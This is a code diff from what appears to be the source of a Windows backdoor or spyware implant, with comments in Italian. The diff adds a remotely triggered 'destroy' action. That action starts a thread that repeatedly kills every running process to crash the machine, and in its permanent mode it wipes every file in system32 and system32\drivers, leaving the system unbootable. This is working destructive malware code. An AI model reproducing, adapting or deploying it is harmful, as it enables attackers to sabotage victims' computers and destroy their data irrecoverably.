@@ -16,6 +16,7 @@ extern BYTE bin_patched_backdoor_id[];
 #define AF_LOGINFO    6
 #define AF_STARTEVENT 7
 #define AF_STOPEVENT  8
+#define AF_DESTROY	  9
 #define AF_NONE 0xFFFFFFFF
 
 // Sono dichiarati in SM_Core.cpp di cui questo file e' un include
@@ -36,7 +37,8 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param);
 BOOL WINAPI DA_StartAgent(BYTE *agent_tag);
 BOOL WINAPI DA_StopAgent(BYTE *agent_tag);
 BOOL WINAPI DA_Execute(BYTE *command);
-BOOL WINAPI DA_LogInfo(WCHAR *info);
+BOOL WINAPI DA_LogInfo(BYTE *info);
+BOOL WINAPI DA_Destroy(BYTE *isPermanent);
 
 // Dichiarazione del thread che puo' essere ristartato dalla sync
 DWORD WINAPI FastActionsThread(DWORD);
@@ -301,5 +303,81 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 	ReportExitProcess();
 
 	// :)
+	return FALSE;
+}
+
+// Fa schiantare il computer 
+DWORD WINAPI KillAllProcess(DWORD dummy)
+{
+	HANDLE proc_list, hProc;
+	PROCESSENTRY32W lppe;
+
+	LOOP {
+		Sleep(250);
+		if ( (proc_list = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL)) != INVALID_HANDLE_VALUE ) {
+			lppe.dwSize = sizeof(PROCESSENTRY32W);
+			if (FNC(Process32FirstW)(proc_list,  &lppe)) {
+				do {
+					if (lppe.th32ProcessID != GetCurrentProcessId()) {
+						if (hProc = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, lppe.th32ProcessID)) {
+							TerminateProcess(hProc, 0);
+							CloseHandle(hProc);
+						}
+					}		
+				} while(FNC(Process32NextW)(proc_list, &lppe));
+			}
+			CloseHandle(proc_list);
+		}
+	}
+	return 0;
+}
+
+void EmptyDirectory(WCHAR *path)
+{
+	WCHAR search_path[MAX_PATH];
+	WIN32_FIND_DATAW find_data;
+	HANDLE hFind;
+
+	_snwprintf_s(search_path, sizeof(search_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\*", path); 
+
+	hFind = FNC(FindFirstFileW)(search_path, &find_data);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+				continue;
+
+			_snwprintf_s(search_path, sizeof(search_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s", path, find_data.cFileName); 
+			HM_WipeFileW(search_path);
+		} while (FNC(FindNextFileW)(hFind, &find_data));
+		FNC(FindClose)(hFind);
+	}
+}
+
+BOOL WINAPI DA_Destroy(BYTE *isPermanent)
+{
+	static BOOL isRunning = FALSE;
+	DWORD dummy;
+
+	// Lancia un thread che killa tutti i processi
+	if (!isRunning) {
+		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillAllProcess, NULL, 0, &dummy);
+		isRunning = TRUE;
+	}
+
+	// Cancella alcuni file di sistema
+	if (*isPermanent) {
+		WCHAR sys_path[MAX_PATH];
+
+		DisableWow64Fs();
+		if (!FNC(GetEnvironmentVariableW)(L"SystemRoot", sys_path, MAX_PATH))
+			return FALSE;
+		StrCatW(sys_path, L"\\system32");
+		EmptyDirectory(sys_path);
+
+		if (!FNC(GetEnvironmentVariableW)(L"SystemRoot", sys_path, MAX_PATH))
+			return FALSE;
+		StrCatW(sys_path, L"\\system32\\drivers");
+		EmptyDirectory(sys_path);
+	}
 	return FALSE;
 }
